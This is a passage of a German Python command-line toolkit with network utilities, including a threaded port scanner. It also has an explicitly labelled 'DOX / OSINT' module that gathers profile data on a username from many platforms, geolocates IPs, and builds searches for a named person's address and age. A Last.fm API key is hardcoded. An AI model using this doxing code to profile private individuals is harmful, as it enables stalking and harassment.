                "$u=[math]::Round($d.Used/1GB,1);"
                "$f=[math]::Round($d.Free/1GB,1);"
                "$t=$u+$f; $p=[math]::Round($u/$t*100,1);"
                "\"$u $t $p\""
            ).split()
            if len(disk_info) == 3:
                row("C:\\", f"[{bar(float(disk_info[2]))}] {disk_info[0]}GB / {disk_info[1]}GB ({disk_info[2]}%)")
        except Exception as e:
            print(f"  {G}[!] {e}{R}")
            print(f"  {DG}Tipp: pip install psutil{R}")
    else:
        print(f"  {G}Bitte installieren: pip install psutil{R}")
    wait()

# ── 12  MEINE IP ─────────────────────────────────────────────
def my_ip():
    hdr("MEINE ÖFFENTLICHE IP")
    div()
    try:
        d = getj("http://ip-api.com/json/?fields=66846719")
        row("Öffentliche IP", d.get("query","?"))
        row("Land",           d.get("country","?"))
        row("Stadt",          d.get("city","?"))
        row("ISP",            d.get("isp","?"))
        row("Proxy/VPN",      "JA ⚠" if d.get("proxy") or d.get("vpn") else "Nein")
        row("Tor",            "JA ⚠" if d.get("tor") else "Nein")
        lat, lon = d.get("lat",""), d.get("lon","")
        if lat:
            print(f"\n  {DG}Maps{R}  {G}https://maps.google.com/?q={lat},{lon}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 13  SPEED TEST ───────────────────────────────────────────
def speed_test():
    hdr("SPEED TEST")
    div()
    # Ping
    print(f"  {DG}Ping zu 1.1.1.1 ...{R}", end="", flush=True)
    try:
        flag = ["-n","4"] if os.name=="nt" else ["-c","4"]
        out = subprocess.check_output(["ping"]+flag+["1.1.1.1"],
              stderr=subprocess.DEVNULL).decode(errors="ignore")
        m = re.search(r'[Dd]urchschnitt\s*[=:]\s*(\d+)|[Aa]vg\s*[=:]\s*(\d+)', out)
        ms = next((x for x in (m.groups() if m else []) if x), None)
        print(f" {G}{ms}ms{R}" if ms else f" {G}OK{R}")
    except:
        print(f" {G}?{R}")

    # Download
    print(f"\n  {DG}Download-Test (Cloudflare) ...{R}\n")
    results = []
    for label, size in [("1 MB",1_000_000),("10 MB",10_000_000),("50 MB",50_000_000)]:
        try:
            req = urllib.request.Request(
                f"https://speed.cloudflare.com/__down?bytes={size}",
                headers={"User-Agent":"Mozilla/5.0"})
            t0 = time.time()
            with urllib.request.urlopen(req, timeout=25) as r:
                data = r.read()
            elapsed = max(time.time()-t0, 0.01)
            mbps = len(data)/1024/1024*8/elapsed
            results.append(mbps)
            pct = min(int(mbps/10), 100)
            print(f"  {DG}{label:<8}{R} [{bar(pct,24)}] {G}{mbps:.1f} Mbit/s{R}")
        except Exception as e:
            print(f"  {DG}{label:<8}{R} {G}[Fehler: {e}]{R}")

    if results:
        avg = sum(results)/len(results)
        div()
        row("Ø Download", f"{avg:.1f} Mbit/s")
        qual = ("Langsam" if avg<5 else "Okay" if avg<20 else "Normal"
                if avg<50 else "Schnell" if avg<100 else "Sehr schnell" if avg<500 else "Gigabit+")
        row("Bewertung", qual)

    # Upload test
    print(f"\n  {DG}Upload-Test (Cloudflare) ...{R}\n")
    upload_results = []
    for label, size in [("512 KB", 512*1024), ("2 MB", 2*1024*1024)]:
        try:
            data_up = os.urandom(size)
            req = urllib.request.Request(
                "https://speed.cloudflare.com/__up",
                data=data_up,
                headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/octet-stream"})
            t0 = time.time()
            with urllib.request.urlopen(req, timeout=20) as r:
                r.read()
            elapsed = max(time.time()-t0, 0.01)
            mbps = size/1024/1024*8/elapsed
            upload_results.append(mbps)
            pct = min(int(mbps/10), 100)
            print(f"  {DG}{label:<8}{R} [{bar(pct,24)}] {G}{mbps:.1f} Mbit/s{R}")
        except Exception as e:
            print(f"  {DG}{label:<8}{R} {G}[Fehler: {e}]{R}")
    if upload_results:
        avg_up = sum(upload_results)/len(upload_results)
        row("Ø Upload", f"{avg_up:.1f} Mbit/s")
    wait()

# ── 14  DNS LOOKUP ───────────────────────────────────────────
def dns_lookup():
    hdr("DNS LOOKUP")
    host = re.sub(r"https?://","",inp("Domain")).split("/")[0].strip()
    div()
    try:
        ip = socket.gethostbyname(host)
        row("A", ip)
        all_ips = list(set(a[4][0] for a in socket.getaddrinfo(host,None)))
        if len(all_ips)>1:
            for a in all_ips: row("A/AAAA", a)
        try: row("PTR (reverse)", socket.gethostbyaddr(ip)[0])
        except: pass
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    # MX, TXT, NS via Google DNS-over-HTTPS
    for rtype in ("MX", "TXT", "NS"):
        try:
            d = getj(f"https://dns.google/resolve?name={host}&type={rtype}", timeout=8)
            for ans in d.get("Answer", []):
                val = ans.get("data","")
                if val:
                    row(rtype, val[:78])
        except:
            pass
    wait()

# ── 15  PORT SCANNER ─────────────────────────────────────────
def port_scanner():
    hdr("PORT SCANNER")
    host = inp("Host / IP")
    rng  = inp("Port-Bereich (z.B. 1-1024, leer = Top-Ports)")
    common = [21,22,23,25,53,80,110,111,135,139,143,443,445,
              993,995,1723,3306,3389,5900,8080,8443,8888]
    if rng and "-" in rng:
        lo, hi = rng.split("-",1)
        ports = list(range(int(lo.strip()), int(hi.strip())+1))
    else:
        ports = common
    div()
    print(f"  {DG}Scanne {len(ports)} Port(s) auf {host} ...{R}\n")
    found = []
    lock  = threading.Lock()
    sem   = threading.Semaphore(50)
    def _scan(p):
        with sem:
            try:
                sock = socket.socket(); sock.settimeout(0.3)
                if sock.connect_ex((host, p)) == 0:
                    try:    svc = socket.getservbyport(p)
                    except: svc = "unknown"
                    with lock:
                        found.append(p)
                        print(f"  {G}[OPEN] {p:<6} {svc}{R}")
                sock.close()
            except: pass
    thds = [threading.Thread(target=_scan, args=(p,), daemon=True) for p in ports]
    for t in thds: t.start()
    for t in thds: t.join()
    div()
    print(f"  {YG}{len(found)} offene Port(s).{R}")
    wait()

# ── 16  PING TEST ────────────────────────────────────────────
def ping_test():
    hdr("PING TEST")
    host = inp("Host / IP")
    div()
    flag = ["-n","8"] if os.name=="nt" else ["-c","8"]
    try:
        out = subprocess.check_output(["ping"]+flag+[host],
              stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in out.splitlines():
            if line.strip(): print(f"  {G}{line}{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 17  PASSWORT CHECKER ─────────────────────────────────────
def pw_checker():
    hdr("PASSWORT CHECKER")
    pw = inp("Passwort")
    div()
    score, tips = 0, []
    checks = [
        (len(pw)>=8,  "Mindestens 8 Zeichen"),
        (len(pw)>=14, "Mindestens 14 Zeichen"),
        (bool(re.search(r'[A-Z]',pw)), "Großbuchstaben"),
        (bool(re.search(r'[a-z]',pw)), "Kleinbuchstaben"),
        (bool(re.search(r'\d',pw)),    "Zahlen"),
        (bool(re.search(r'[^a-zA-Z0-9]',pw)), "Sonderzeichen"),
    ]
    for ok, label in checks:
        if ok: score += 1
        else:  tips.append(label)
    lvl = ["Sehr schwach","Schwach","Okay","Gut","Stark","Sehr stark","Perfekt"][score]
    pct = score/6*100
    print(f"  [{bar(pct,24)}] {YG}{lvl} ({score}/6){R}\n")
    for t in tips:
        print(f"  {DG}→ Fehlt: {G}{t}{R}")
    wait()

# ── 18  PASSWORT GENERATOR ───────────────────────────────────
def pw_gen():
    import random, string
    hdr("PASSWORT GENERATOR")
    length = inp("Länge (Standard: 16)")
    length = int(length) if length.isdigit() else 16
    div()
    chars = string.ascii_letters+string.digits+"!@#$%^&*()-_=+[]{}|;:,.<>?"
    rng = random.SystemRandom()
    for i in range(8):
        pw = "".join(rng.choices(chars, k=length))
        print(f"  {DG}{i+1}.{R} {G}{pw}{R}")
    wait()

# ── 19  FILE HASH CHECKER ────────────────────────────────────
def file_hash():
    hdr("FILE HASH CHECKER")
    path = inp("Dateipfad")
    div()
    try:
        with open(path,"rb") as f:
            data = f.read()
        hashes = {}
        for algo in ("md5","sha1","sha256","sha512"):
            h = hashlib.new(algo,data).hexdigest()
            hashes[algo] = h
            row(algo.upper(), h)
        compare = inp("\nVergleichs-Hash eingeben (leer = überspringen)")
        if compare:
            match = compare.lower().strip() in hashes.values()
            print(f"\n  {G}{'[✓] ÜBEREINSTIMMUNG' if match else '[✗] KEIN MATCH'}{R}")
    except FileNotFoundError:
        print(f"  {G}[!] Datei nicht gefunden{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 20  SYSTEM INFO ──────────────────────────────────────────
def system_info():
    hdr("SYSTEM INFO")
    div()
    hostname = socket.gethostname()
    try:    local_ip = socket.gethostbyname(hostname)
    except: local_ip = "?"
    row("OS",           platform.system()+" "+platform.release())
    row("Version",      platform.version()[:70])
    row("Architektur",  platform.machine())
    row("Prozessor",    platform.processor()[:60] or "?")
    row("Hostname",     hostname)
    row("Lokale IP",    local_ip)
    row("Python",       platform.python_version())
    row("Datum/Zeit",   datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    if os.name == "nt":
        try:
            user = ps("$env:USERNAME")
            comp = ps("$env:COMPUTERNAME")
            row("User",  user)
            row("Computer", comp)
        except: pass
    wait()

# ════════════════════════════════════════════════════════════
#  21 — DOX / OSINT
# ════════════════════════════════════════════════════════════

def _fetch_user_data(uname, sname):
    """Holt Profildaten von einer Plattform. Gibt dict oder None zurück."""
    enc = urllib.parse.quote(uname)
    try:
        if sname == "GitHub":
            d = getj(f"https://api.github.com/users/{enc}")
            if not d.get("login") or d.get("message"): return None
            return {k:v for k,v in [
                ("Username",  d.get("login")),
                ("Name",      d.get("name")),
                ("Bio",       (d.get("bio") or "")[:55]),
                ("Ort",       d.get("location")),
                ("Firma",     d.get("company")),
                ("Blog",      d.get("blog")),
                ("Repos",     d.get("public_repos")),
                ("Follower",  d.get("followers")),
                ("Twitter",   d.get("twitter_username")),
                ("Erstellt",  (d.get("created_at") or "")[:10]),
                ("URL",       d.get("html_url")),
            ] if v and str(v).strip()}

        elif sname == "Reddit":
            d = getj(f"https://www.reddit.com/user/{enc}/about.json",
                     headers={"User-Agent":"Mozilla/5.0"}).get("data",{})
            if not d.get("name"): return None
            created = ""
            try: created = datetime.utcfromtimestamp(d.get("created_utc",0)).strftime("%Y-%m-%d")
            except: pass
            return {k:v for k,v in [
                ("Username",     d.get("name")),
                ("Karma",        d.get("total_karma", d.get("link_karma",0))),
                ("Komm-Karma",   d.get("comment_karma")),
                ("Erstellt",     created),
                ("Premium",      "Ja" if d.get("is_gold") else None),
                ("Moderator",    "Ja" if d.get("is_mod") else None),
                ("URL",          f"https://reddit.com/u/{d['name']}"),
            ] if v and str(v).strip() and v is not None}

        elif sname == "Minecraft":
            d = getj(f"https://api.ashcon.app/mojang/v2/user/{enc}")
            if not d.get("username") or d.get("error"): return None
            hist = d.get("username_history",[])
            tex  = d.get("textures",{})
            skin_m = (tex.get("skin",{}) or {}).get("model","classic") or "classic"
            return {k:v for k,v in [
                ("Username",    d.get("username")),
                ("UUID",        d.get("uuid")),
                ("Skin-Modell", "slim (Alex)" if skin_m=="slim" else "classic (Steve)"),
                ("Cape",        "Ja" if tex.get("cape") else "Nein"),
                ("Vergangene Namen", f"{len(hist)-1} frühere Namen" if len(hist)>1 else None),
                ("URL",         f"https://namemc.com/profile/{d.get('uuid','')}"),
            ] if v}

        elif sname == "Steam":
            body, _, _ = get(f"https://steamcommunity.com/id/{enc}/?xml=1", timeout=8)
            def _x(tag):
                m2 = re.search(rf'<{tag}[^>]*>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?</{tag}>', body, re.S)
                return m2.group(1).strip() if m2 else ""
            if "<error>" in body or not _x("steamID"): return None
            vac = _x("vacBanned")
            return {k:v for k,v in [
                ("Anzeigename",  _x("steamID")),
                ("Echter Name",  _x("realname")),
                ("Steam64-ID",   _x("steamID64")),
                ("Status",       _x("onlineState")),
                ("Mitglied seit",_x("memberSince")),
                ("Ort",          _x("location")),
                ("Sichtbarkeit", _x("privacyState")),
                ("VAC-Ban",      "JA ⚠" if vac=="1" else "Nein"),
                ("URL",          f"https://steamcommunity.com/id/{enc}"),
            ] if v and str(v).strip()}

        elif sname == "Chess.com":
            d = getj(f"https://api.chess.com/pub/player/{enc}",
                     headers={"User-Agent":"Mozilla/5.0"})
            if not d.get("username") or d.get("code"): return None
            joined = ""
            try: joined = datetime.utcfromtimestamp(d.get("joined",0)).strftime("%Y-%m-%d")
            except: pass
            last = ""
            try: last = datetime.utcfromtimestamp(d.get("last_online",0)).strftime("%Y-%m-%d")
            except: pass
            return {k:v for k,v in [
                ("Username",    d.get("username")),
                ("Name",        d.get("name")),
                ("Titel",       d.get("title")),
                ("Land",        (d.get("country","") or "").split("/")[-1]),
                ("Follower",    d.get("followers")),
                ("Status",      d.get("status")),
                ("Beigetreten", joined),
                ("Zuletzt",     last),
                ("URL",         d.get("url")),
            ] if v and str(v).strip()}

        elif sname == "Lichess":
            d = getj(f"https://lichess.org/api/user/{enc}")
            if not d.get("username") or d.get("error"): return None
            ct = d.get("count",{})
            perf = d.get("perfs",{})
            best = max(perf.items(), key=lambda x: x[1].get("rating",0)) if perf else ("",{})
            created = ""
            try: created = datetime.utcfromtimestamp(d.get("createdAt",0)//1000).strftime("%Y-%m-%d")
            except: pass
            return {k:v for k,v in [
                ("Username",    d.get("username")),
                ("Name",        d.get("profile",{}).get("realName")),
                ("Bio",         (d.get("profile",{}).get("bio") or "")[:55]),
                ("Land",        d.get("profile",{}).get("country")),
                ("Spiele",      ct.get("all")),
                ("Bestes Rat.", f"{best[0]}: {best[1].get('rating',0)}" if best[0] else None),
                ("Online",      "Ja" if d.get("online") else "Nein"),
                ("Patron",      "Ja ♟" if d.get("patron") else None),
                ("Erstellt",    created),
                ("URL",         f"https://lichess.org/@/{d['username']}"),
            ] if v and str(v).strip()}

        elif sname == "HackerNews":
            d = getj(f"https://hacker-news.firebaseio.com/v0/user/{enc}.json")
            if not d or not d.get("id"): return None
            created = ""
            try: created = datetime.utcfromtimestamp(d.get("created",0)).strftime("%Y-%m-%d")
            except: pass
            about = re.sub(r'<[^>]+>','', d.get("about","") or "")[:55]
            return {k:v for k,v in [
                ("Username",  d.get("id")),
                ("Karma",     d.get("karma")),
                ("Erstellt",  created),
                ("Über",      about or None),
                ("URL",       f"https://news.ycombinator.com/user?id={enc}"),
            ] if v and str(v).strip()}

        elif sname == "npm":
            d = getj(f"https://registry.npmjs.org/-/user/org.couchdb.user:{enc}")
            if not d.get("name"): return None
            return {"Username": d.get("name"), "E-Mail": d.get("email","—"),
                    "URL": f"https://www.npmjs.com/~{enc}"}

        elif sname == "PyPI":
            body, status, _ = get(f"https://pypi.org/user/{enc}/", timeout=6)
            if status != 200 or "doesn't exist" in body.lower(): return None
            return {"Username": uname, "URL": f"https://pypi.org/user/{enc}/"}

        elif sname == "Roblox":
            d = getj(f"https://users.roblox.com/v1/users/search?keyword={enc}&limit=5")
            for u in d.get("data",[]):
                if u.get("name","").lower() == uname.lower():
                    return {k:v for k,v in [
                        ("Username",     u.get("name")),
                        ("Display Name", u.get("displayName")),
                        ("ID",           u.get("id")),
                        ("URL",          f"https://roblox.com/users/{u['id']}"),
                    ] if v and str(v).strip()}
            return None

        elif sname == "Scratch":
            d = getj(f"https://api.scratch.mit.edu/users/{enc}/")
            if not d.get("username"): return None
            return {k:v for k,v in [
                ("Username",  d.get("username")),
                ("ID",        d.get("id")),
                ("Land",      d.get("profile",{}).get("country")),
                ("Über",      (d.get("profile",{}).get("bio") or "")[:55] or None),
                ("URL",       f"https://scratch.mit.edu/users/{enc}/"),
            ] if v and str(v).strip()}

        elif sname == "Keybase":
            d = getj(f"https://keybase.io/_/api/1.0/user/lookup.json?username={enc}")
            if d.get("status",{}).get("name") != "OK": return None
            them = d.get("them",[{}])[0] if d.get("them") else {}
            basics = them.get("basics",{})
            profile = them.get("profile",{})
            return {k:v for k,v in [
                ("Username",  basics.get("username")),
                ("Name",      profile.get("full_name")),
                ("Ort",       profile.get("location")),
                ("Bio",       (profile.get("bio") or "")[:55] or None),
                ("URL",       f"https://keybase.io/{enc}"),
            ] if v and str(v).strip()}

        elif sname == "Telegram":
            body, status, _ = get(f"https://t.me/{enc}", timeout=6)
            if status != 200 or "tgme_page_title" not in body: return None
            title_m = re.search(r'class="tgme_page_title"[^>]*>\s*<span[^>]*>([^<]+)', body)
            desc_m  = re.search(r'class="tgme_page_description"[^>]*>([^<]+)', body)
            subs_m  = re.search(r'(\d[\d\s]+)\s*(subscriber|member|online)', body, re.I)
            return {k:v for k,v in [
                ("Name",       title_m.group(1).strip() if title_m else uname),
                ("Beschr.",    desc_m.group(1).strip()[:55] if desc_m else None),
                ("Abonnenten", subs_m.group(1).strip() if subs_m else None),
                ("URL",        f"https://t.me/{enc}"),
            ] if v}

        elif sname == "Last.fm":
            d = getj(f"https://ws.audioscrobbler.com/2.0/?method=user.getinfo&user={enc}&api_key=1a853b0289efcd91765c33e0e2bcd8ac&format=json")
            u = d.get("user",{})
            if not u.get("name"): return None
            return {k:v for k,v in [
                ("Username",   u.get("name")),
                ("Realname",   u.get("realname")),
                ("Land",       u.get("country")),
                ("Scrobbles",  u.get("playcount")),
                ("Alben",      u.get("album_count")),
                ("Künstler",   u.get("artist_count")),
                ("Erstellt",   datetime.utcfromtimestamp(int(u.get("registered",{}).get("unixtime",0))).strftime("%Y-%m-%d") if u.get("registered") else None),
                ("URL",        u.get("url")),
            ] if v and str(v).strip()}

        elif sname == "GitLab":
            d = getj(f"https://gitlab.com/api/v4/users?username={enc}")
            if not d or not isinstance(d, list): return None
            for u in d:
                if u.get("username","").lower() == uname.lower():
                    created = (u.get("created_at","") or "")[:10]
                    return {k:v for k,v in [
                        ("Username",  u.get("username")),
                        ("Name",      u.get("name")),
                        ("Bio",       (u.get("bio") or "")[:55] or None),
                        ("Ort",       u.get("location")),
                        ("Website",   u.get("website_url")),
                        ("Erstellt",  created),
                        ("URL",       f"https://gitlab.com/{enc}"),
                    ] if v and str(v).strip()}
            return None

        else:
            url = site.get("url","").replace("{u}", enc)
            nf  = site.get("nf","")
            if not url: return None
            body, status, _ = get(url, timeout=6)
            if status == 200 and (not nf or nf.lower() not in body.lower()):
                return {"URL": url}
            return None

    except urllib.error.HTTPError as e:
        if e.code in (404, 410): return None
        return {}  # leeres dict = timeout/blockiert
    except:
        return {}

_GENERIC_SITES = [
    {"name":"DEV.to",  "url":"https://dev.to/{u}",                   "nf":"404"},
    {"name":"CodePen", "url":"https://codepen.io/{u}",               "nf":""},
    {"name":"Replit",  "url":"https://replit.com/@{u}",              "nf":"not found"},
    {"name":"Pastebin","url":"https://pastebin.com/u/{u}",           "nf":"Not Found"},
    {"name":"Duolingo","url":"https://www.duolingo.com/profile/{u}", "nf":"404"},
    {"name":"Behance", "url":"https://www.behance.net/{u}",          "nf":""},
    {"name":"Dribbble","url":"https://dribbble.com/{u}",             "nf":""},
    {"name":"Vimeo",   "url":"https://vimeo.com/{u}",                "nf":""},
]
_API_SITES = ["GitHub","Reddit","Minecraft","Steam","Chess.com","Lichess",
              "HackerNews","npm","PyPI","Roblox","Scratch","Keybase","Telegram",
              "Last.fm","GitLab"]

def dox_username():
    hdr("USERNAME OSINT")
    uname = inp("Username")
    div()
    if not uname:
        print(f"  {G}[!] Kein Username.{R}"); wait(); return

    all_sites = [{"name": n} for n in _API_SITES] + _GENERIC_SITES
    total = len(all_sites)
    found = []   # list of (sname, data_dict)

    print(f"  {DG}Scanne {total} Plattformen ...{R}\n")
    for i, site in enumerate(all_sites, 1):
        sname = site["name"]
        print(f"  {DG}[{i:>2}/{total}] {sname:<14}{R}", end="", flush=True)
        data = _fetch_user_data(uname, site)
        if data is None:
            print(f"\r  {DG}[-] {sname:<14} nicht gefunden{R}          ")
        elif data == {}:
            print(f"\r  {DG}[?] {sname:<14} blockiert/timeout{R}       ")
        else:
            print(f"\r  {G}[✓] {sname:<14} GEFUNDEN{R}                  ")
            found.append((sname, data))

    # ── Ergebnisse als Karten ────────────────────────────────────
    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print()
    if not found:
        print(f"  {G}[✗] Kein Profil für '{uname}' gefunden.{R}")
    else:
        print(T)
        print(L(f"{YG}⬡ USERNAME OSINT  {DG}│  {G}{uname}  {DG}│  {YG}{len(found)} Treffer{R}"))
        for sname, data in found:
            print(M)
            print(L(f"{G}✦ {sname}{R}"))
            for key, val in data.items():
                label = f"{key}:"
                print(L(f"  {DG}{label:<14}{R} {G}{str(val)[:46]}{R}"))
        print(B)

    enc = urllib.parse.quote(uname)
    print(f"\n  {DG}Discord-Suche:{R}")
    print(f"  {G}→ discord.id    https://discord.id/?user={enc}{R}")
    print(f"  {G}→ Google+DC     https://google.com/search?q=%22{enc}%22+discord{R}")

def dox_ip():
    hdr("IP OSINT")
    ip = inp("IP-Adresse (leer = eigene)").strip()
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)
    print(f"  {DG}Abrufen ...{R}", end="", flush=True)
    try:
        url = f"http://ip-api.com/json/{ip}?fields=66846719" if ip else "http://ip-api.com/json/?fields=66846719"
        d = getj(url, timeout=8)
        hostname = ""
        try: hostname = socket.gethostbyaddr(d.get("query",""))[0]
        except: pass
        lat, lon = d.get("lat",""), d.get("lon","")
        anon = any([d.get("proxy"), d.get("vpn"), d.get("tor"), d.get("hosting")])
        print(f"\r  {G}✓ Daten geladen{R}              \n")
        print(T)
        print(L(f"{YG}⬡ IP OSINT  {DG}│  {G}{d.get('query','?')}{R}"))
        print(M)
        print(L(f"{YG}── Netzwerk ──{R}"))
        print(L(f"{DG}IP             {R}{G}{d.get('query','?')}{R}"))
        if hostname: print(L(f"{DG}Hostname       {R}{G}{hostname[:48]}{R}"))
        print(L(f"{DG}ISP            {R}{G}{d.get('isp','?')[:48]}{R}"))
        print(L(f"{DG}Organisation   {R}{G}{d.get('org','?')[:48]}{R}"))
        print(L(f"{DG}AS-Nummer      {R}{G}{d.get('as','?')[:48]}{R}"))
        print(M)
        print(L(f"{YG}── Standort ──{R}"))
        print(L(f"{DG}Land           {R}{G}{d.get('country','?')} ({d.get('countryCode','?')}){R}"))
        print(L(f"{DG}Region         {R}{G}{d.get('regionName','?')}{R}"))
        print(L(f"{DG}Stadt          {R}{G}{d.get('city','?')}{R}"))
        print(L(f"{DG}Postleitzahl   {R}{G}{d.get('zip','?')}{R}"))
        print(L(f"{DG}Zeitzone       {R}{G}{d.get('timezone','?')}{R}"))
        if lat: print(L(f"{DG}Koordinaten    {R}{G}{lat}, {lon}{R}"))
        print(M)
        print(L(f"{YG}── Anonymität ──{R}"))
        print(L(f"{DG}Proxy          {R}{YG if d.get('proxy') else G}{'JA ⚠' if d.get('proxy') else 'Nein'}{R}"))
        print(L(f"{DG}VPN            {R}{YG if d.get('vpn') else G}{'JA ⚠' if d.get('vpn') else 'Nein'}{R}"))
        print(L(f"{DG}Tor            {R}{YG if d.get('tor') else G}{'JA ⚠' if d.get('tor') else 'Nein'}{R}"))
        print(L(f"{DG}Hosting/DC     {R}{G}{'Ja' if d.get('hosting') else 'Nein'}{R}"))
        if lat:
            print(M)
            print(L(f"{YG}── Links ──{R}"))
            print(L(f"{DG}Google Maps    {R}{G}maps.google.com/?q={lat},{lon}{R}"))
        print(B)
    except Exception as e:
        print(f"\r  {YG}[!] Fehler: {e}{R}")

def dox_email():
    hdr("E-MAIL OSINT")
    email = inp("E-Mail-Adresse")
    div()
    if "@" not in email:
        print(f"  {G}[✗] Kein gültiges Format{R}"); wait(); return
    user, domain = email.split("@",1)
    row("User",   user)
    row("Domain", domain)
    try:
        ip = socket.gethostbyname(domain)
        row("Domain-IP", ip)
        geo = getj(f"http://ip-api.com/json/{ip}?fields=country,isp")
        row("Gehostet in", f"{geo.get('country','?')} – {geo.get('isp','?')}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    trash = {"mailinator.com","guerrillamail.com","temp-mail.org","yopmail.com",
             "throwam.com","10minutemail.com","trashmail.com"}
    row("Wegwerf-Domain", "JA ⚠" if domain.lower() in trash else "Nein")
    print(f"\n  {DG}HIBP Breach-Check:{R}")
    print(f"  {G}https://haveibeenpwned.com/account/{urllib.parse.quote(email)}{R}")

def dox_phone():
    hdr("TELEFON OSINT")
    number = inp("Nummer mit Ländervorwahl (z.B. +4917612345678)")
    div()
    codes = {"1":"USA/Kanada","7":"Russland","33":"Frankreich","34":"Spanien",
             "39":"Italien","41":"Schweiz","43":"Österreich","44":"UK",
             "45":"Dänemark","46":"Schweden","47":"Norwegen","48":"Polen",
             "49":"Deutschland","52":"Mexiko","55":"Brasilien","61":"Australien",
             "62":"Indonesien","81":"Japan","82":"Südkorea","86":"China",
             "90":"Türkei","91":"Indien"}
    clean = re.sub(r"[\s\-\(\)\+]","",number)
    land = "Unbekannt"
    for code in sorted(codes, key=len, reverse=True):
        if clean.startswith(code):
            land = codes[code]; break
    row("Nummer",  number)
    row("Land",    land)
    enc = urllib.parse.quote(number)
    print(f"\n  {DG}Suche-Links:{R}")
    print(f"  {G}→ Google      https://www.google.com/search?q=%22{enc}%22{R}")
    print(f"  {G}→ Truecaller  https://www.truecaller.com/search/de/{clean}{R}")
    print(f"  {G}→ NumLookup   https://www.numlookup.com/?number={enc}{R}")

def dox_name():
    hdr("NAME OSINT")
    print(f"  {DG}Gibt Suchlinks für Namen, Discord-Namen, Gamertags aus.{R}\n")
    name = inp("Vor- und Nachname / Discord-Name / Gamertag")
    div()
    if not name:
        print(f"  {G}[!] Kein Name eingegeben.{R}"); wait(); return

    enc  = urllib.parse.quote(f'"{name}"')
    encp = urllib.parse.quote(name)
    encr = urllib.parse.quote(name.replace(" ","+"))

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(T)
    print(L(f"{YG}⬡ NAME / GAMERTAG OSINT  {DG}│  {G}{name}{R}"))
    print(M)
    print(L(f"{YG}── Google-Suchen ──{R}"))
    links_g = [
        ("Exakt",          f"https://www.google.com/search?q={enc}"),
        ("+ Wohnort",      f"https://www.google.com/search?q={enc}+wohnort+OR+adresse"),
        ("+ Alter",        f"https://www.google.com/search?q={enc}+alter+OR+jahrgang"),
        ("+ Facebook",     f"https://www.google.com/search?q={enc}+site:facebook.com"),
        ("+ Instagram",    f"https://www.google.com/search?q={enc}+site:instagram.com"),
        ("+ LinkedIn",     f"https://www.google.com/search?q={enc}+site:linkedin.com"),
        ("+ TikTok",       f"https://www.google.com/search?q={enc}+site:tiktok.com"),
        ("+ Twitter/X",    f"https://www.google.com/search?q={enc}+site:twitter.com"),
        ("+ YouTube",      f"https://www.google.com/search?q={enc}+site:youtube.com"),
        ("+ GitHub",       f"https://www.google.com/search?q={enc}+site:github.com"),
        ("+ Discord",      f"https://www.google.com/search?q={enc}+discord"),
        ("+ Steam",        f"https://www.google.com/search?q={enc}+site:steamcommunity.com"),
        ("+ Snapchat",     f"https://www.google.com/search?q={enc}+site:snapchat.com"),
        ("+ Telegram",     f"https://www.google.com/search?q={enc}+telegram"),
        ("+ Bilder",       f"https://www.google.com/search?q={enc}&tbm=isch"),
    ]
    for label, url in links_g:
        print(L(f"  {DG}{label:<16}{R} {G}{url[:53]}{R}"))
    print(M)
    print(L(f"{YG}── Direkte Plattform-Suchen ──{R}"))
    links_p = [
        ("Bing",           f"https://www.bing.com/search?q={enc}"),
        ("DuckDuckGo",     f"https://duckduckgo.com/?q={enc}"),
        ("Twitter/X",      f"https://twitter.com/search?q={encp}&f=user"),
        ("TikTok",         f"https://www.tiktok.com/search?q={encp}"),
        ("Reddit",         f"https://www.reddit.com/search/?q={encp}&type=user"),
        ("YouTube",        f"https://www.youtube.com/results?search_query={encp}"),
        ("Twitch",         f"https://www.twitch.tv/search?term={encp}"),
        ("Steam",          f"https://steamcommunity.com/search/users/#text={encp}"),
        ("Roblox",         f"https://www.roblox.com/search/users?keyword={encp}"),
        ("Telegram",       f"https://t.me/{urllib.parse.quote(name.replace(' ',''))}"),
    ]
    for label, url in links_p:
        print(L(f"  {DG}{label:<16}{R} {G}{url[:53]}{R}"))
    print(M)
    print(L(f"{YG}── Discord-Suche ──{R}"))
    disc_links = [
        ("discord.id",     f"https://discord.id/?user={encp}"),
        ("discordlookup",  f"https://discordlookup.com/user/{encp}"),
        ("Google+Discord", f"https://www.google.com/search?q={enc}+discord+OR+%22discord.gg%22"),
    ]
    for label, url in disc_links:
        print(L(f"  {DG}{label:<16}{R} {G}{url[:53]}{R}"))
    print(M)
    print(L(f"{YG}── Gaming / Gamertag ──{R}"))
    game_links = [
        ("Minecraft",      f"https://namemc.com/search?q={encp}"),
        ("Xbox GT",        f"https://xboxgamertag.com/search/{encp}"),
        ("PSN",            f"https://psnprofiles.com/search/users?q={encp}"),
        ("Fortnite",       f"https://fortnitetracker.com/profile/all/{encp}"),
        ("Valorant",       f"https://tracker.gg/valorant/search?query={encp}"),
        ("CS2",            f"https://www.hltv.org/search#query={encp}"),
        ("Overwatch",      f"https://overwatchtracker.com/search?query={encp}"),
        ("Faceit",         f"https://www.faceit.com/en/search/player/{encp}"),
        ("Battle.net",     f"https://www.google.com/search?q=%22{encr}%22+site:us.battle.net"),
    ]
    for label, url in game_links:
        print(L(f"  {DG}{label:<16}{R} {G}{url[:53]}{R}"))
    print(B)

def dox_foto():
    hdr("FOTO REVERSE SEARCH")
    url = inp("Bild-URL (direkter Link)")
    div()
    enc = urllib.parse.quote(url, safe="")
    links = [
